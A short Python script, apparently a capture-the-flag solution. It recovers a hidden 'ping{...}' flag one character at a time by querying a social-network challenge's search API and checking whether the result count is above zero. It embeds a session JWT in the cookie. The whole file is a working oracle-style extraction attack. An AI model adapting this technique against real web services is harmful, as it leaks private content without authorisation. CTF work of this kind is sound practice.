import requests
import string
import json

cookies = {'token':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVhMjcxNGRmLWFmYTUtNDVjMS05ZTJhLTZmZTRlNDc4NWQyMiIsInVzZXJuYW1lIjoiZXZ5YXRhcjkiLCJpYXQiOjE2NzE3MTEwNDEsImV4cCI6MTY3MTc5NzQ0MX0.unAEH3wW3u6zaf3plNDEJYbTb4sMO4OmsaK9wux5NzI'}

headers = {'Accept':'application/json'}

flag='ping{'
options = string.printable

# Replace special URL characters
options = options.replace('#','')
options = options.replace('&','')

while '}' not in flag:

    for c in options:
        current = flag+c
        r = requests.get(f'https://friendsbook.knping.pl/api/post/wall?q={current}', cookies=cookies, headers=headers)
        #print(r.text)
        resp = json.loads(r.text)
        if resp['count'] > 0:
            flag +=c
            print(flag)
            break
			
print(f'The flag: {flag}')
            